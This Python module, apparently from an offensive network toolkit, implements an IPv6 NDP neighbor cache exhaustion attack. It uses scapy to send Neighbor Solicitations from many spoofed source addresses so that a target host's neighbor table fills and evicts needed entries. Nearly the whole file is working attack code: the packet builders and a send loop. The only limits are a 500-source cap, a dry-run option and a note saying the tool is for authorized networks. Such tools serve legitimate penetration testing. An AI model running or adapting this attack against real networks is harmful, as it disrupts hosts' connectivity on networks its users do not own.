"""NDP neighbor cache exhaustion: make a host create neighbor entries for many addresses that do not exist.

A host that receives a Neighbor Solicitation with a source link-layer address option creates or refreshes
a neighbor cache entry for the sender (RFC 4861). The cache has a limit. Each solicitation from a new
source address takes one slot, so a stream of them from addresses on the same /64 fills the table and
can push out entries the host needs.

This module sends Neighbor Solicitations to a target address on the segment. Each one comes from a
different source address inside the prefix you give, with the source link-layer address option set to
the operator's MAC, from the operator's MAC, with hop limit 255. The effect to measure is how many
entries the host creates for those sources, and where it stops.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.inet6 import (
    ICMPv6ND_NS,
    ICMPv6NDOptSrcLLAddr,
    IPv6,
)
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.rogue_router_advertisement import link_local_from_mac

MAX_SOURCES = 500
SOURCE_OFFSET = 0x1000          # sources start at prefix::1000 so they do not collide with hosts at low addresses
SOLICITED_NODE_PREFIX = ipaddress.IPv6Address("ff02::1:ff00:0")


def validate_prefix(prefix: str) -> ipaddress.IPv6Network:
    try:
        network = ipaddress.IPv6Network(prefix, strict=False)
    except ValueError as exc:
        raise ValueError(f"Prefix {prefix!r} is not an IPv6 network.") from exc
    if network.prefixlen != 64:
        raise ValueError("Source prefix must be a /64, so there are enough addresses to vary.")
    return network


def validate_target(address: str, network: ipaddress.IPv6Network) -> ipaddress.IPv6Address:
    try:
        parsed = ipaddress.IPv6Address(address)
    except ValueError as exc:
        raise ValueError(f"Target {address!r} is not an IPv6 address.") from exc
    if parsed.is_multicast or parsed.is_unspecified:
        raise ValueError("Target must be a unicast IPv6 address.")
    if parsed not in network:
        raise ValueError("Target must be inside the source prefix, so it is on the same link.")
    return parsed


def solicited_node(target: ipaddress.IPv6Address) -> str:
    """The solicited-node multicast address for a target: ff02::1:ff00:0/104 plus its last 24 bits."""
    return str(ipaddress.IPv6Address(int(SOLICITED_NODE_PREFIX) | (int(target) & 0xFFFFFF)))


def solicited_node_mac(target: ipaddress.IPv6Address) -> str:
    low = int(target) & 0xFFFFFF
    return f"33:33:ff:{(low >> 16) & 0xFF:02x}:{(low >> 8) & 0xFF:02x}:{low & 0xFF:02x}"


@dataclass(frozen=True)
class NdpNeighborCacheExhaustionConfig:
    iface: str                          # attacker interface, on the segment with the victim
    source_mac: str                     # the MAC every entry will point to (required)
    target: str = ""                    # the host whose neighbor cache is filled (required, inside the prefix)
    prefix: str = "2001:db8:c0::/64"    # the /64 the spoofed sources come from
    count: int = 200                    # solicitations sent, one new source address each
    dry_run: bool = False               # build solicitations but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        network = validate_prefix(self.prefix)
        if not self.target:
            raise ValueError("Target IPv6 address is required.")
        validate_target(self.target, network)
        if not 1 <= self.count <= MAX_SOURCES:
            raise ValueError(f"Solicitations must be between 1 and {MAX_SOURCES}.")


@dataclass
class NdpNeighborCacheExhaustionStats:
    frames: int = 0
    status: str = ""


def source_address(network: ipaddress.IPv6Network, index: int) -> ipaddress.IPv6Address:
    return ipaddress.IPv6Address(int(network.network_address) + SOURCE_OFFSET + index)


def build_solicitation(config: NdpNeighborCacheExhaustionConfig, index: int) -> Packet:
    """One Neighbor Solicitation from a new source address, with the operator's MAC as its source link-layer option."""
    network = validate_prefix(config.prefix)
    target = validate_target(config.target, network)
    source = normalize_unicast_mac(config.source_mac)
    return (
        Ether(src=source, dst=solicited_node_mac(target))
        / IPv6(src=str(source_address(network, index)), dst=solicited_node(target), hlim=255)
        / ICMPv6ND_NS(tgt=str(target))
        / ICMPv6NDOptSrcLLAddr(lladdr=source)
    )


def build_solicitations(config: NdpNeighborCacheExhaustionConfig) -> list[Packet]:
    return [build_solicitation(config, index) for index in range(config.count)]


def run_ndp_neighbor_cache_exhaustion(
    config: NdpNeighborCacheExhaustionConfig,
    stop_event: threading.Event,
    on_progress: Callable[[NdpNeighborCacheExhaustionStats], None],
    send: Callable[..., Any] | None = None,
) -> NdpNeighborCacheExhaustionStats:
    """Send `count` solicitations, each from a new source address, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = NdpNeighborCacheExhaustionStats(
            status=(
                f"Dry run: would send {config.count} Neighbor Solicitation(s) to {config.target} from {config.count} "
                f"source address(es) in {config.prefix}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = NdpNeighborCacheExhaustionStats()
    for frame in build_solicitations(config):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.frames} solicitation(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
    return stats
